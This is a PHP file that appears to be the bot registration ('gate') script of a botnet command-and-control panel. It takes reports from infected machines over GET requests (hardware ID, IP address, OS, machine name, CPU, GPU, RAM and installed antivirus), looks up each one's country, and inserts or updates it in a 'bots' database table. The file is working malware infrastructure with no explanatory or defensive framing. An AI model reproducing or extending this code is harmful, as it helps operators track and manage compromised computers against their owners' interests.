<?php

include '../inc/config.php';
include '../inc/functions.php';

if(isset($_GET['hwid']))
{
    $info = array(
        'hwid'    => $_GET['hwid'],
        'ip'      => $_GET['ip'],
        'os'      => GrabOS($_GET['os']),
        'name'    => $_GET['name'],
        'ram'     => $_GET['ram'],
        'cpu'     => $_GET['cpu'],
        'country' => GrabCountry($_GET['ip']),
        'gpu'     => $_GET['gpu'],
        'av'      => $_GET['av'],
        'first'   => time()
    );
    $data = $con->prepare("SELECT COUNT(*) FROM bots WHERE hwid = ?");
    $data->execute(array($info['hwid']));
    if($data->fetch()[0] < 1)
        $con->prepare("INSERT INTO bots (hwid, ip, os, name, ram, cpu, country, gpu, av, firstconnected) VALUES(:hwid, :ip, :os, :name, :ram, :cpu, :country, :gpu, :av, :first)")->execute(
            array(
                ':hwid'    => $info['hwid'],
                ':ip'      => $info['ip'],
                ':os'      => $info['os'],
                ':name'    => $info['name'],
                ':ram'     => $info['ram'],
                ':cpu'     => $info['cpu'],
                ':country' => $info['country'],
                ':gpu'     => $info['gpu'],
                ':av'      => $info['av'],
                ':first'   => $info['first']
            )
        );
    else
        $con->prepare("UPDATE bots SET ip=:ip, os=:os, name=:name, ram=:ram, cpu=:cpu, country=:country, gpu=:gpu, av=:av WHERE hwid=:hwid")->execute(
            array(
                ':hwid' => $info['hwid'],
                ':ip' => $info['ip'],
                ':os' => $info['os'],
                ':name' => $info['name'],
                ':ram' => $info['ram'],
                ':cpu' => $info['cpu'],
                ':country' => $info['country'],
                ':gpu' => $info['gpu'],
                ':av' => $info['av']
            )
        );
}